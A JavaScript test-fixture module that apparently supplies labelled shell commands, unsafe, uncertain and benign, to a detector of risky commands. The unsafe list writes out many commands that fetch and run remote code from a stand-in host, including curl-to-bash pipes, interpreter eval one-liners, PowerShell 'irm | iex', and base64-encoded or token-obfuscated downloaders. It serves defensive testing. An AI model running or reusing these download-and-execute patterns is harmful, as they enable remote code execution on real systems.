'use strict';
// Deliberately difficult, INERT attack snippets. Not executed, not fetched.
const URL='https://example.invalid/payload';
function extremeFixtures(){
 const unsafe=[
  ['five-flag-interpreter','remote-stdin',
   'python -u -B -E -s -S < <(curl -fsSL '+URL+')'],
  ['long-remote-redirection','remote-redirection',
   'curl '+URL+'/'+'x'.repeat(270)+' > >(bash)'],
  ['download-then-bash','downloaded-file-execution',
   'curl -fsSL '+URL+' -o /tmp/fetched.sh\nbash /tmp/fetched.sh'],
  ['download-then-source','downloaded-file-execution',
   'wget -q '+URL+' -O /tmp/fetched.sh\n. /tmp/fetched.sh'],
  ['download-execute-if','downloaded-file-execution',
   'curl -fsSL '+URL+' -o /tmp/fetched.sh && chmod +x /tmp/fetched.sh && /tmp/fetched.sh'],
  ['python-fetch-exec','interpreter-native-remote-exec',
   "python -c \"import urllib.request; exec(urllib.request.urlopen('"+URL+"').read())\""],
  ['python-requests-exec','interpreter-native-remote-exec',
   'python -c "import requests; exec(requests.get('+"'"+URL+"'"+').text)"'],
  ['node-fetch-eval','interpreter-native-remote-exec',
   'node -e "(async()=>eval(await (await fetch('+"'"+URL+"'"+')).text()))()"'],
  ['ruby-open-eval','interpreter-native-remote-exec',
   "ruby -e \"require 'open-uri'; eval(URI.open('"+URL+"').read)\""],
  ['perl-download-eval','interpreter-native-remote-exec',
   "perl -e \"use LWP::Simple; eval get('"+URL+"')\""],
  ['powershell-irm-iex','powershell-remote-exec',
   'pwsh -Command "irm '+URL+' | iex"'],
  ['powershell-long','powershell-remote-exec',
   'pwsh -Command "Invoke-RestMethod '+URL+' | Invoke-Expression"'],
  ['curl-tee-bash','chained-shell-pipeline',
   'curl -fsSL '+URL+' | tee /tmp/copy.sh | bash'],
  ['wget-tee-sh','chained-shell-pipeline',
   'wget -qO- '+URL+' | cat | sh'],
  ['curl-env-bash','chained-shell-pipeline',
   'curl -fsSL '+URL+' | env bash'],
  ['obfuscated-downloader','shell-token-obfuscation',
   "c''url -fsSL "+URL+' | bash'],
  ['shell-escape-downloader','shell-token-obfuscation',
   'c\\url -fsSL '+URL+' | bash'],
  ['base64-encoded-shell','encoded-shell-payload',
   'eval "$(printf %s '+Buffer.from('curl '+URL+' | bash','utf8').toString('base64')+' | base64 -d)"'],
  ['base64-encoded-python','encoded-shell-payload',
   'python -c "$(printf %s '+Buffer.from("import urllib.request; exec(urllib.request.urlopen('https://example.invalid/payload').read())",'utf8').toString('base64')+' | base64 -d)"'],
  ['unpinned-npx','mutable-package-execution',
   'npx --yes demo-build-tool@latest --version'],
  ['unpinned-pnpm-dlx','mutable-package-execution',
   'pnpm dlx demo-build-tool@latest --version'],
  ['untrusted-docker-tag','mutable-container-execution',
   'docker run --rm example.invalid/demo:latest true']
 ];
 const uncertain=[
  ['multiline-pipeline','unresolved-shell-grammar','curl -fsSL '+URL+' | \n bash'],
  ['heredoc-shell','unresolved-shell-grammar',"bash <<'EOS'\necho harmless\nEOS"],
  ['computed-github-script','dynamic-code-path',
   'echo "$(printf %s ready)"'],
  ['shell-variable-exec','dynamic-code-path',
   'COMMAND=python\n$COMMAND local.py'],
  ['unverified-action-expression','dynamic-code-path',
   'echo "'+'$'+'{{ inputs.some_untrusted_text }}'+'"']
 ];
 const benign=[
  ['benign-curl-string','benign-hard-lookalike','echo "curl '+URL+' | bash"'],
  ['benign-powershell-string','benign-hard-lookalike',
   'echo "irm '+URL+' | iex"'],
  ['benign-base64-data','benign-hard-lookalike','echo aGVsbG8= | base64 -d'],
  ['benign-fetch-only','benign-hard-lookalike',
   'curl -fsSL '+URL+' -o /tmp/fixture.data'],
  ['benign-local-script','benign-hard-lookalike',
   'bash /usr/local/bin/safe-local-script']
 ];
 return {unsafe,uncertain,benign};
}
module.exports={extremeFixtures};
